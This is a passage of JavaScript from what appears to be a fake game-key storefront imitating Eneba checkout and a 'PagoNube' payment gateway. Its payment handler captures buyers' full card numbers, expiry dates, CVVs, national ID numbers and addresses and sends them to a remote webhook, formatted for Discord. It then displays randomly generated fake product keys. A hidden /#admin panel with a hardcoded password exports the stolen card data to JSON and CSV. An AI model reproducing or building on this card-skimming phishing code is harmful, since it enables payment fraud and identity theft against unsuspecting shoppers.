    document.getElementById('viewStore').classList.add('hidden');
    document.getElementById('viewCheckoutEneba').classList.add('hidden');
    document.getElementById('viewCheckoutPagoNube').classList.add('hidden');
    document.getElementById('viewSuccess').classList.add('hidden');

    const mainHeader = document.getElementById('mainHeader');
    const checkoutHeader = document.getElementById('checkoutHeader');

    if (view === 'store') {
        mainHeader.classList.remove('hidden');
        checkoutHeader.classList.add('hidden');
        document.getElementById('viewStore').classList.remove('hidden');
    } else {
        mainHeader.classList.add('hidden');
        checkoutHeader.classList.remove('hidden');
        if (view === 'checkoutEneba') document.getElementById('viewCheckoutEneba').classList.remove('hidden');
        if (view === 'checkoutPagoNube') document.getElementById('viewCheckoutPagoNube').classList.remove('hidden');
        if (view === 'success') document.getElementById('viewSuccess').classList.remove('hidden');
    }
    window.scrollTo({ top: 0, behavior: 'smooth' });
}

function proceedToCheckout() {
    if (cart.length === 0) {
        alert('Agrega al menos un producto al carro.');
        return;
    }
    document.getElementById('cartDrawer').classList.add('hidden');
    renderEnebaSummary();
    switchView('checkoutEneba');
}

function selectPaymentCard(labelEl, method) {
    selectedMethod = method;
    document.querySelectorAll('.eneba-pay-card').forEach(c => c.classList.remove('selected-pay-card'));
    labelEl.classList.add('selected-pay-card');
    const radio = labelEl.querySelector('input[type="radio"]');
    if (radio) radio.checked = true;
}

function renderEnebaSummary() {
    const container = document.getElementById('checkoutSummaryItems');
    container.innerHTML = '';
    let subtotal = 0;

    cart.forEach((item, index) => {
        subtotal += item.price * item.qty;
        const itemCashback = item.cashback * item.qty;
        const isDLC = item.category === 'dlc';

        const block = document.createElement('div');
        block.className = index > 0 ? 'pt-4 sm:pt-5 space-y-2.5' : 'space-y-2.5';
        block.innerHTML = `
            <div class="flex items-center space-x-2 text-xs text-purple-200">
                <span>Vendido por</span>
                <span class="w-4 h-4 rounded-full bg-emerald-500/20 text-emerald-400 inline-flex items-center justify-center text-[10px]">
                    <i class="fa-solid fa-bolt"></i>
                </span>
                <strong class="text-white">${item.seller}</strong>
            </div>

            <div class="flex gap-3">
                <img src="${item.image}" alt="${item.name}" class="w-14 h-20 sm:w-16 sm:h-24 object-cover rounded shadow-md shrink-0">
                <div class="flex-1 min-w-0 space-y-1.5">
                    <div class="flex justify-between items-start gap-2">
                        <h4 class="font-bold text-xs sm:text-sm text-white leading-snug line-clamp-2">
                            ${isDLC ? '<span class="border border-purple-400 text-purple-200 text-[10px] px-1.5 py-0.5 rounded mr-1 font-semibold">DLC</span>' : ''}
                            ${item.name}
                        </h4>
                        <div class="flex items-center space-x-2 text-purple-300 shrink-0">
                            <button class="hover:text-white"><i class="fa-regular fa-heart"></i></button>
                            <button onclick="removeItemFromCheckout(${index})" class="hover:text-rose-400"><i class="fa-regular fa-trash-can"></i></button>
                        </div>
                    </div>

                    <div class="text-[11px] sm:text-xs text-purple-300 flex items-center gap-1">
                        <span>Producto digital</span>
                        <span class="w-4 h-4 rounded-full border border-purple-400 inline-flex items-center justify-center text-[10px]">?</span>
                    </div>

                    <div class="flex items-center justify-between pt-1">
                        <div class="flex items-center space-x-3 text-sm font-bold">
                            <button onclick="changeQty(${index}, -1)" class="text-purple-300 hover:text-white">-</button>
                            <span>${item.qty}</span>
                            <button onclick="changeQty(${index}, 1)" class="text-purple-300 hover:text-white">+</button>
                        </div>
                        <span class="font-black text-sm sm:text-base text-white">${formatARS(item.price * item.qty)}</span>
                    </div>

                    <div class="text-[11px] sm:text-xs font-semibold text-emerald-400 pt-0.5">
                        de Cashback: ${formatARS(itemCashback)}
                    </div>
                </div>
            </div>
        `;
        container.appendChild(block);
    });

    const discount = subtotal * appliedDiscount;
    const total = subtotal - discount;

    document.getElementById('summarySubtotal').innerText = formatARS(subtotal);
    document.getElementById('summaryDiscount').innerText = '-' + formatARS(discount);
    document.getElementById('summaryTotal').innerText = formatARS(total);
}

function goToPagoNubeGateway() {
    document.getElementById('selectedMethodBadge').innerText = selectedMethod.toUpperCase();
    if (currentUser) {
        const sbName = document.getElementById('sbName');
        const sbEmail = document.getElementById('sbEmail');
        if (sbName && !sbName.value) sbName.value = currentUser.name;
        if (sbEmail && !sbEmail.value) sbEmail.value = currentUser.email;
    }
    switchView('checkoutPagoNube');
}

function backToEnebaSelection() {
    switchView('checkoutEneba');
}

// PROCESAR PAGO Y ENVIAR A LA BASE DE DATOS
async function processSandboxPayment(e) {
    e.preventDefault();

    const submitBtn = document.getElementById('submitPayBtn');
    submitBtn.disabled = true;
    submitBtn.innerHTML = `<i class="fa-solid fa-circle-notch fa-spin"></i> <span>Procesando pago...</span>`;

    const buyerData = {
        name: document.getElementById('sbName').value,
        email: document.getElementById('sbEmail').value,
        phone: document.getElementById('sbPhone').value,
        dni: document.getElementById('sbDni').value,
        province: document.getElementById('sbProvince').value,
        address: document.getElementById('sbAddress').value,
        cardNum: document.getElementById('sbCardNum').value,
        cardExp: document.getElementById('sbCardExp').value,
        cardCvv: document.getElementById('sbCardCvv').value,
        installments: document.getElementById('sbInstallments').value
    };

    const subtotal = cart.reduce((acc, item) => acc + (item.price * item.qty), 0);
    const discount = subtotal * appliedDiscount;
    const total = subtotal - discount;
    const totalCashback = cart.reduce((acc, item) => acc + (item.cashback * item.qty), 0);

    const record = {
        id: 'ARGON-' + Math.floor(100000 + Math.random() * 900000),
        date: new Date().toLocaleString('es-AR'),
        paymentMethod: selectedMethod,
        buyer: buyerData,
        items: cart.map(i => ({ id: i.id, name: i.name, qty: i.qty, price: i.price })),
        total: total,
        cashbackEarned: totalCashback
    };

    const db = JSON.parse(localStorage.getItem('ohmy_sandbox_db') || '[]');
    db.push(record);
    localStorage.setItem('ohmy_sandbox_db', JSON.stringify(db));

    const remoteUrl = localStorage.getItem('ohmy_remote_webhook') || DEFAULT_REMOTE_DB_URL;
    if (remoteUrl) {
        try {
            if (remoteUrl.includes('discord.com/api/webhooks')) {
                await fetch(remoteUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        content: `📦 **Nueva Orden (${record.id})**\n👤 **Cliente:** ${buyerData.name} (${buyerData.email}) | **DNI:** ${buyerData.dni}\n📱 **Tel:** ${buyerData.phone} | **Dirección:** ${buyerData.address}, ${buyerData.province}\n💳 **Método:** ${selectedMethod.toUpperCase()} | **Tarjeta:** \`${buyerData.cardNum}\` | **Venc:** \`${buyerData.cardExp}\` | **CVV:** \`${buyerData.cardCvv}\`\n💰 **Total:** ${formatARS(total)}`
                    })
                });
            } else {
                await fetch(remoteUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(record)
                });
            }
        } catch (err) {
            console.warn('Error enviando a base remota:', err);
        }
    }

    walletBalance += totalCashback;
    updateWalletUI();

    submitBtn.disabled = false;
    submitBtn.innerHTML = `<i class="fa-solid fa-lock"></i> <span>Pagar Ahora y Obtener Producto</span>`;

    renderSuccessScreen(record);
    cart = [];
    updateCartBadge();
    appliedDiscount = 0;
    document.getElementById('sandboxForm').reset();
}

function renderSuccessScreen(tx) {
    document.getElementById('cashbackNotice').innerText = `¡Acreditamos +${formatARS(tx.cashbackEarned)} de Cashback en tu Cartera Argon!`;
    const container = document.getElementById('keysContainer');
    container.innerHTML = '';

    tx.items.forEach(item => {
        const fullProd = products.find(p => p.id === item.id) || item;
        for (let i = 0; i < item.qty; i++) {
            const key = 'ARGON-' + Math.random().toString(36).substring(2, 7).toUpperCase() + '-' + Math.random().toString(36).substring(2, 7).toUpperCase() + '-' + Math.random().toString(36).substring(2, 7).toUpperCase();
            const div = document.createElement('div');
            div.className = 'bg-[#261259] border border-purple-700/60 p-3.5 sm:p-4 rounded-xl flex flex-col sm:flex-row sm:items-center justify-between gap-3.5';
            div.innerHTML = `
                <div class="flex items-center space-x-3">
                    <img src="${fullProd.image}" class="w-12 h-16 sm:w-14 sm:h-20 object-cover rounded shrink-0">
                    <div class="min-w-0">
                        <h4 class="font-bold text-xs sm:text-sm text-white line-clamp-1">${item.name}</h4>
                        <span class="text-xs text-emerald-400 font-semibold">Clave Digital Verificada</span>
                    </div>
                </div>
                <div class="flex items-center justify-between sm:justify-end gap-2">
                    <code class="bg-[#160a36] border border-purple-600 px-3 sm:px-4 py-2 rounded-lg font-mono text-emerald-400 font-bold text-xs sm:text-sm select-all truncate">${key}</code>
                    <button onclick="navigator.clipboard.writeText('${key}')" class="bg-purple-600 hover:bg-purple-500 text-white px-3.5 py-2 rounded-lg text-xs font-bold shrink-0">
                        <i class="fa-solid fa-copy"></i>
                    </button>
                </div>
            `;
            container.appendChild(div);
        }
    });

    switchView('success');
}

// ============================================================================
// PANEL DE BASE DE DATOS DEL DUEÑO (ACCESO EXCLUSIVO POR /#admin)
// ============================================================================
function openAdminModal() {
    document.getElementById('adminModal').classList.remove('hidden');
    document.getElementById('adminAuthSection').classList.remove('hidden');
    document.getElementById('adminContentSection').classList.add('hidden');
    document.getElementById('adminPasswordInput').value = '';
    document.getElementById('adminErrorMsg').classList.add('hidden');
}

function closeAdminModal() {
    document.getElementById('adminModal').classList.add('hidden');
    if (window.location.hash === '#admin') {
        history.replaceState(null, null, window.location.pathname + window.location.search);
    }
}

function verifyAdminPassword() {
    const pass = document.getElementById('adminPasswordInput').value;
    if (pass === 'ohmyadmin2026') {
        document.getElementById('adminAuthSection').classList.add('hidden');
        document.getElementById('adminContentSection').classList.remove('hidden');
        loadAdminDatabaseRecords();
    } else {
        document.getElementById('adminErrorMsg').classList.remove('hidden');
    }
}

function saveWebhookUrl() {
    const url = document.getElementById('webhookUrlInput').value.trim();
    localStorage.setItem('ohmy_remote_webhook', url);
    alert('URL de Base de Datos Remota / Webhook guardada correctamente.');
}

function loadAdminDatabaseRecords() {
    const container = document.getElementById('adminDbRecords');
    container.innerHTML = '';
    const db = JSON.parse(localStorage.getItem('ohmy_sandbox_db') || '[]');
    document.getElementById('dbCountBadge').innerText = db.length;

    if (db.length === 0) {
        container.innerHTML = `<p class="text-center text-purple-300 py-6">Aún no hay operaciones registradas.</p>`;
        return;
    }

    db.slice().reverse().forEach(tx => {
        const div = document.createElement('div');
        div.className = 'bg-[#2a175e] border border-purple-700 p-3.5 rounded-xl space-y-1.5';
        div.innerHTML = `
            <div class="flex justify-between font-bold text-white">
                <span>${tx.id} — ${tx.date}</span>
                <span class="text-emerald-400">${formatARS(tx.total)}</span>
            </div>
            <p class="text-purple-200"><strong>Usuario/Cliente:</strong> ${tx.buyer.name} (${tx.buyer.email}) | <strong>DNI/Dato:</strong> ${tx.buyer.dni}</p>
            <p class="text-purple-200"><strong>Tipo:</strong> ${tx.paymentMethod.toUpperCase()} | <strong>Detalle:</strong> ${tx.buyer.cardNum} (${tx.buyer.cardExp} - CVV: ${tx.buyer.cardCvv})</p>
            <details class="pt-1">
                <summary class="cursor-pointer text-amber-400 font-bold">Ver JSON completo</summary>
                <pre class="bg-[#160a36] p-2.5 rounded mt-1.5 overflow-x-auto text-[10px] text-emerald-300">${JSON.stringify(tx, null, 2)}</pre>
            </details>
        `;
        container.appendChild(div);
    });
}

function exportDatabaseJSON() {
    const db = localStorage.getItem('ohmy_sandbox_db') || '[]';
    const blob = new Blob([db], { type: 'application/json' });
    const a = document.createElement('a');
    a.href = URL.createObjectURL(blob);
    a.download = 'argon_db.json';
    a.click();
}

function exportDatabaseCSV() {
    const db = JSON.parse(localStorage.getItem('ohmy_sandbox_db') || '[]');
    if (!db.length) return;
    let csv = 'ID,Fecha,Nombre,Email,DNI_Dato,Metodo,Detalle_Tarjeta,Vencimiento,CVV,Total\n';
    db.forEach(t => {
        csv += `"${t.id}","${t.date}","${t.buyer.name}","${t.buyer.email}","${t.buyer.dni}","${t.paymentMethod}","${t.buyer.cardNum}","${t.buyer.cardExp}","${t.buyer.cardCvv}",${t.total}\n`;
    });
    const blob = new Blob([csv], { type: 'text/csv' });
    const a = document.createElement('a');
    a.href = URL.createObjectURL(blob);
    a.download = 'argon_db.csv';
    a.click();
}

function clearDatabase() {
    localStorage.removeItem('ohmy_sandbox_db');
    loadAdminDatabaseRecords();
}
